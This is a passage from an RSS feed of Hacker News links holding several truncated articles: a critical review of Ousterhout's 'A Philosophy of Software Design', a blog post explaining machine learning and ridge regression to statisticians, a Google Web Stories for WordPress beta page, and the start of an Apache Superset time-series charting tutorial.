<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<div>
<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>off_t</span> <span>lseek</span><span>(</span><span>int</span> <span>fd,</span> <span>off_t</span> <span>offset,</span> <span>int</span> <span>referencePosition);</span>
<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>
</blockquote>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html</a></em></p>]]>
            </description>
            <link>http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710374</guid>
            <pubDate>Thu, 02 Jul 2020 05:46:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Moving from Statistics to Machine Learning, the Final Stage of Grief]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23710210">thread link</a>) | @yoloswagins
<br/>
July 1, 2020 | https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/ | <a href="https://web.archive.org/web/*/https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-47">

	<!-- .entry-header -->

	<div>
		
<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/">https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/</a></em></p>]]>
            </description>
            <link>https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710210</guid>
            <pubDate>Thu, 02 Jul 2020 05:11:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Stories for WordPress by Google and open source]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23710051">thread link</a>) | @nilsandrey
<br/>
July 1, 2020 | https://google.github.io/web-stories-wp/beta/ | <a href="https://web.archive.org/web/*/https://google.github.io/web-stories-wp/beta/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <header>
        
        
        <ul>
            <li><a href="#about">About</a></li>
            <li><a href="#get-started">Get Started</a></li>
            <li><a href="#faq">FAQ</a></li>
            <li><a href="https://github.com/google/web-stories-wp">GitHub</a></li>
            <li><a href="https://github.com/google/web-stories-wp/releases/download/v1.0.0-beta.1/web-stories.zip">Download Beta</a></li>
        </ul>
    </header>

    <section>
        <div>
            <h2>Stories Editor</h2>
            <h3><span>Get</span> <span>Ready</span> <span>to</span> <span>Tell</span> <span>Stories</span> <span>on</span> <span>WordPress</span></h3>
            <p>We're not quite ready for prime time yet, but if you like to live dangerously, we invite you to try our first public beta.</p>
            
        </div>
        
        
    </section>

    <section>
        <h2><a id="about">About</a></h2>
        <p>With Stories for WordPress, we're bringing first-class Web Stories support to WordPress.</p>
    </section>

    <amp-animation id="videoAnim" layout="nodisplay">
        
    </amp-animation>    
    <section>
        <amp-position-observer intersection-ratios="0.4" on="enter:videoAnim.start" layout="nodisplay" once="">
        </amp-position-observer>
        <p>WYSIWYG all the way</p>
        <amp-video width="1920" height="1200" layout="responsive" title="Stories for WordPress in action" src="./assets/wysiwyg.mp4" loop="" muted="" autoplay="">
    </amp-video></section>

    <amp-animation id="templateAnim" layout="nodisplay">
    
    </amp-animation>
    <section>
        <amp-position-observer intersection-ratios="0.5" on="enter:templateAnim.start" layout="nodisplay" once="">
        </amp-position-observer>
        <p>Expressive Templates</p>
        <ul>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/1.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/2.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/3.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/4.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/5.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/6.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/7.png"></amp-img></li>
            <li><amp-img layout="responsive" width="542" height="840" src="./assets/templates/8.png"></amp-img></li>
        </ul>
    </section>

     <section>
        <h2><a id="get-started">Get Started</a></h2>
        <div>
            <p>Welcome</p>
            <h3>Tips to make the most of the Beta</h3>
            <p>Welcome! Starting on a new tool can be daunting, so we created a Web Story (naturally!) with some tips to help you get started. We can't wait to see your stories!</p>
            <p>Click <a href="https://google.github.io/web-stories-wp/beta/tips.html">here</a> or on the image to view.</p>
        </div>
        
     </section>

     <section>
        <h2><a id="faq">FAQ</a></h2>
        <dl>
            <dt>Where can I learn more about Web Stories?</dt>
            <dd><a href="https://amp.dev/about/stories/">Web Stories</a> are tappable, engaging visual stories brought to the web. They’re powered by AMP technology, so learn more about them on <a href="https://amp.dev/about/stories/">amp.dev</a>.</dd>
        
            <dt>How do I install the Stories for WordPress plugin?</dt>
            <dd>
                As soon as we’re graduating from beta, the plugin will be available on WordPress.org. While we’re in beta, the plugin has to be downloaded as zip. After that:

                <ol>
                    <li>Navigate to Plugins &gt; Add New.</li>
                    <li>Click the Upload Plugin button at the top of the screen.</li>
                    <li>Select the zip file from your local filesystem.</li>
                    <li>Click the Install Now button.</li>
                    <li>When installation is complete, you’ll see “Plugin installed successfully.” Click the Activate Plugin button at the bottom of the page.</li>
                </ol>
            </dd>
        
            <dt>I found a bug or missing feature! How do I report it?</dt>
            <dd>Awesome! That’s exactly what the beta is for. Please submit feedback and <a href="https://github.com/google/web-stories-wp/issues">file a bug or feature request on Github</a> for now - we'll follow up with an easier-to-use feedback form in the next days. Your help is greatly appreciated.</dd>

            <dt>When is the final version shipping, and what will be included?</dt>
            <dd>Later this summer. In addition to stabilization, performance fixes and bug fixes, the final version will also include animation and page attachment support.</dd>
        </dl>
     </section>

     



</div>]]>
            </description>
            <link>https://google.github.io/web-stories-wp/beta/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710051</guid>
            <pubDate>Thu, 02 Jul 2020 04:37:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build Time Series Charts with Apache Superset]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23709687">thread link</a>) | @ceohockey60
<br/>
July 1, 2020 | https://preset.io/blog/2020-06-26-timeseries-chart/ | <a href="https://web.archive.org/web/*/https://preset.io/blog/2020-06-26-timeseries-chart/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="analyzing-time-series-data-with-superset"><a href="#analyzing-time-series-data-with-superset" aria-label="analyzing time series data with superset permalink"></a>Analyzing Time Series data with Superset</h2>
<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>
<h3 id="data-requirement-for-time-series-charts"><a href="#data-requirement-for-time-series-charts" aria-label="data requirement for time series charts permalink"></a>Data Requirement for Time Series Charts</h3>
<div><p><a href="https://preset.io/static/5a17c1be58c04aebf85fae427033adba/f84ea/image0.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/5a17c1be58c04aebf85fae427033adba/f84ea/image0.png" srcset="https://preset.io/static/5a17c1be58c04aebf85fae427033adba/7b5b4/image0.png 188w,
https://preset.io/static/5a17c1be58c04aebf85fae427033adba/a80c4/image0.png 376w,
https://preset.io/static/5a17c1be58c04aebf85fae427033adba/f84ea/image0.png 632w" sizes="(max-width: 632px) 100vw, 632px">
  </span>
  </a></p></div>
<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>
<h2 id="time-series-bar-chart"><a href="#time-series-bar-chart" aria-label="time series bar chart permalink"></a>Time Series Bar Chart</h2>
<p>Time series bar charts represent categories by vertical charts.</p>
<div><p><a href="https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/823b0/image1.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/f6afc/image1.png" srcset="https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/7b5b4/image1.png 188w,
https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/a80c4/image1.png 376w,
https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/f6afc/image1.png 752w,
https://preset.io/static/4b72eaa35dfd978add023bf3488ba556/823b0/image1.png 954w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>
<div><p><a href="https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/2f950/image2.png" target="_blank" rel="noopener">
    <span>
    <span></span>
    <img alt="GitHub API doc" title="image_tooltip" src="https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/f6afc/image2.png" srcset="https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/7b5b4/image2.png 188w,
https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/a80c4/image2.png 376w,
https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/f6afc/image2.png 752w,
https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/3f9be/image2.png 1128w,
https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/a34ba/image2.png 1504w,
https://preset.io/static/6625d81f550bc233e42ed2c04e0ac8a0/2f950/image2.png 1600w" sizes="(max-width: 752px) 100vw, 752px">
  </span>
  </a></p></div>
